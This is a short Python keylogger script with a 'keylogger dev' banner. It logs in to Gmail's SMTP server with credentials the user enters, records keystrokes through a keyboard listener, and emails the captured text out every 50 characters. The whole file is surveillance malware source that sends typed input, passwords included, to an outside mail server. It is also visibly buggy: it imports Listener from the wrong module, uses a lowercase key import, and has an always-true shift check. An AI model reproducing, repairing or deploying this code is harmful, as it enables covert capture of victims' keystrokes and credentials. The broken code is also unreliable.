import getpass
from multiprocessing.connection import Listener
import smtplib
from pynput.keyboard import key, listener

print('''  _         _                _               __ _           _           
| |__ ___ | |__  ___  __ _ | |_  ___  _ _  / _` |       __| | ___ __ __
| / // _ \|  _ \/ _ \/ _` ||  _|/ -_)| ' \ \__. |      / _` |/ -_)\ V /
|_\_\\___/|____/\___/\__/_| \__|\___||_||_||___/       \__/_|\___| \_/ 
''')

#set up email
email = input('Enter email: ')
password = getpass.getpass(prompt='Password: ', stream=None)
server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
server.login(email, password)

#logger
full_log = ''
word =''
email_char_limit = 50

def on_press(key):
    global word, full_log, email, email_char_limit

    if key == key.space or key == key.enter:
        word+= ' '
        full_log += word
        word = ''
        if len(full_log) >= email_char_limit:
            send_log()
            full_log = ''
    elif key == key.shift_1 or key.shift_r:
        return
    elif key == key.backspace:
        word = word[:-1]
    else:
        char = f'{key}'
        char = char[1:-1]
        word += char 

    if key == key.esc:
        return False


def send_log():
    server.sendmail(
        email,
        email,
        full_log
    )



with Listener( 
    on_press=on_press) as listener:
    listener.join()